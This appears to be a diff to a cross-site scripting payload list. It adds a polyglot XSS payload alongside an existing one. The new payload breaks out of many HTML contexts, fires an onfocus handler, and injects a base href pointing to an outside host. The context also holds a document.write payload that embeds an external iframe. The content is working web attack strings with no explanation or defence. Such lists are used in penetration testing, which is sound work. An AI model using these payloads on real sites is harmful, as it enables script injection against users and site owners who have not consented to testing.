@@ -4,6 +4,8 @@
 # Polyglot attack:
 /*-/*`/*\`/*"/**(/* */oNcLiCk=alert())//%0D%0A%0d%0a//</sTyLe/</TitLe/</tExtArEa/</sCRipT/--!>\x3csVg/<sVg/oNloAd=alErT()//>\x3e
 
+//%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+
 # Mario :v
 document.write%28%3Ciframe%20src%3D%22http%3A//supermarioemulator.com/Mario.php%22%20height%3D640%20width%3D%22816%22%3E%3C/iframe%3E%29
 
